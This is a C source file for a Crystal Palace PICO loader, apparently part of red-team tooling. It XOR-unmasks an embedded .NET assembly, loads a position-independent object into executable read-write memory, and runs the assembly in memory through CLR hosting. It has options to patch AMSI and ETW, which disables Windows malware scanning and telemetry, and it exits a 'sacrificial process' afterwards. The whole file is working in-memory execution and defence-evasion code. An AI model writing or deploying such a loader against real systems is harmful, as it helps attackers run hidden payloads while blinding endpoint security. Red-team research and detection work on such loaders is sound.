/**
 * Crystal Palace - A PICO for Crystal Palace that implements CLR hosting to execute a .NET assembly in memory. 
 * @ref - https://github.com/ofasgard/execute-assembly-pico/blob/main/src/execute_assembly.c
 */
#include <windows.h>
#include "tcg.h"

WCHAR __CMDLINE__[1024] __attribute__((section(".rdata")));
BOOL __PATCHEXITFLAG__[1] __attribute__((section(".rdata")));
BOOL __PATCHAMSIFLAG__[1] __attribute__((section(".rdata")));
BOOL __PATCHETWFLAG__[1] __attribute__((section(".rdata")));


WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);

/**
 * Linked resources
 */
char __PICODATA__[0] __attribute__((section("my_pico")));
char __ASSEMBLY__[0] __attribute__((section("my_assembly")));
char __KEYDATA__[0] __attribute__((section("my_key")));

/**
 * Structs
 */
typedef HRESULT (*EXECUTE_ASSEMBLY_PICO)(
    char *assembly, 
    size_t assembly_len, 
    WCHAR *argv[], 
    BOOL patchExit,
    BOOL patchAmsi,
    BOOL patchEtw
);

typedef struct {
    __typeof__(LoadLibraryA)   * LoadLibraryA;
    __typeof__(GetProcAddress) * GetProcAddress;
    __typeof__(VirtualAlloc)   * VirtualAlloc;
    __typeof__(VirtualFree)    * VirtualFree;
} WIN32FUNCS;

typedef struct {
    int   len;
    char  buf[];
} _ASSEMBLY;

char * findAppendedPICO() {
    return (char *)&__PICODATA__;
}

char * findAppendedAssembly() {
    return (char *)&__ASSEMBLY__;
}

char * findAppendedKey() {
    return (char *)&__KEYDATA__;
}

/*
 * Our embedded resources are masked, so we need to unmask them.
 */
typedef struct {
    int   length;
    char  value[];
} _RESOURCE;
 
char * unmask(char * srcData) {
    _RESOURCE * key;
    _RESOURCE * src;
    char      * dst;
 
    /* parse our preplen + xor'd $KEY and our masked data too */
    key = (_RESOURCE *)findAppendedKey();
    src = (_RESOURCE *)srcData;
 
    /* allocate memory for our unmasked content */
    dst = KERNEL32$VirtualAlloc( NULL, src->length, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
 
    /* unmask it */
    for (int x = 0; x < src->length; x++) {
        dst[x] = src->value[x] ^ key->value[x % key->length];
    }
 
    return dst;
}



/**
 * Helpers
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
    HANDLE hModule = findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
  HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
  if (hModule == NULL) {
    hModule = KERNEL32$LoadLibraryA(mod);
  }
  return KERNEL32$GetProcAddress(hModule, func);
}


void run_clr_pico(
    WIN32FUNCS * funcs, 
    char * srcPico, 
    LPCWSTR* assemblyArgs,
    BOOL patchExitFlag,
    BOOL patchAmsiflag,
    BOOL patchEtwflag
) 
{
    char        * dstCode;
    char        * dstData;
     
    /* allocate memory for our PICO */
    dstData = funcs->VirtualAlloc( NULL, PicoDataSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
    dstCode = funcs->VirtualAlloc( NULL, PicoCodeSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
  
    /* load our pico into our destination address, thanks! */
    PicoLoad((IMPORTFUNCS *)funcs, srcPico, dstCode, dstData);
  
    /* And, we can call our pico entry point */
    EXECUTE_ASSEMBLY_PICO entryPoint = (EXECUTE_ASSEMBLY_PICO) PicoEntryPoint(srcPico, dstCode);
    
    /* Get length-prefixed resource */
    _RESOURCE* masked_assembly = (_RESOURCE*)findAppendedAssembly();
    SIZE_T     assembly_len    = masked_assembly->length;

    /* Unmask the assembly resource */
    char* assembly = unmask(masked_assembly);
    
    /* Off we go! */
    HRESULT result = entryPoint(
        assembly, 
        assembly_len, 
        assemblyArgs, 
        patchExitFlag,
        patchAmsiflag,
        patchEtwflag
    );

    /* free everything... */
    funcs->VirtualFree(dstData, 0, MEM_RELEASE);
    funcs->VirtualFree(dstCode, 0, MEM_RELEASE);
    funcs->VirtualFree(assembly, 0, MEM_RELEASE);
}

void go() 
{
	// Resolve necessary WIN32 APIs.
	WIN32FUNCS funcs;
	funcs.LoadLibraryA      = KERNEL32$LoadLibraryA;
	funcs.GetProcAddress    = KERNEL32$GetProcAddress;
	funcs.VirtualAlloc      = KERNEL32$VirtualAlloc;
	funcs.VirtualFree       = KERNEL32$VirtualFree;
	
	// Get a pointer to the section containing our PICO.
	char *pico = findAppendedPICO();
	
	// Arguments to pass to the assembly.
	LPCWSTR cmdline = (LPCWSTR)&__CMDLINE__;
    BOOL patchExitflag  = (BOOL)&__PATCHEXITFLAG__;
	BOOL patchAmsiflag  = (BOOL)&__PATCHAMSIFLAG__;
	BOOL patchEtwflag   = (BOOL)&__PATCHETWFLAG__;

	// Run the PICO.
	run_clr_pico(&funcs, pico, cmdline, patchExitflag, patchAmsiflag, patchEtwflag);

    // Important! Exit sacrificial process
    KERNEL32$ExitProcess(0);
}